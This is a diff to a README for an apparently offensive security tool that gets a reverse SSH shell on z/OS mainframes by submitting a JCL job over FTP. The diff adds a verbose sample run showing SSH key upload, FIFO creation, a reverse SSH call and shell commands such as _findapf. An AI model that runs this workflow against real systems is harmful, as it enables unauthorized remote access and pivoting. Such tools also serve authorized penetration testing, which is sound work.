@@ -2,21 +2,37 @@
 
 I wanted a secure reverse shell, with builtin pivoting functions, On a mainframe!
 
-This repo contains a few Python modules and scripts to get a secure reverse shell by submitting a JCL job via FTP on z/OS.
+This repo contains a few Python modules and scripts to get a secure reverse shell by submitting a JCL job via FTP on z/OS. Here's a verbose example:
 
 ```
-$ python ftp2shell.py config.ini
+$ python ftp2shell.py config.ini -v
 Input the password for zuser on target.mainframe.net:
+INFO:root:Auto-detecting the ssh server fingerprint
+INFO:root:Generating SSH keys
 
-Save the pulic key below in ~ccserveraccount/.ssh/authorized_keys
+Save the pulic key below in ~cc_user/.ssh/authorized_keys
 
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+og7UDXjtluvauvB3Uo7eFqYGTDYlptkd[...]
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB[...]
 
 Press Enter to continue...
-mf.bigiron.local> uname
+INFO:root:Opening FTP connection to the target at target.mainframe.net
+INFO:root:Generating temporary files for the shell
+INFO:root:Uploading the SSH key on the target
+INFO:root:Uploading the host fingerprint on the target
+INFO:root:Creating the FIFO for the shell
+INFO:root:Running the reverse SSH command
+INFO:root:Shell preparation
+INFO:root:Waiting for target.mainframe.net activation
+target.mainframe.net> uname
 OS/390
-mf.bigiron.local> exit
-This will terminate the connection to mf.bigiron.local, are you sure? (y/N) y
+target.mainframe.net> help
+
+Documented commands (type help <topic>):
+========================================
+EOF  _findapf  _runssh  exit  help
+
+target.mainframe.net> exit
+This will terminate the connection to target.mainframe.net, are you sure? (y/N) y
 ```
 
 ## Usage:
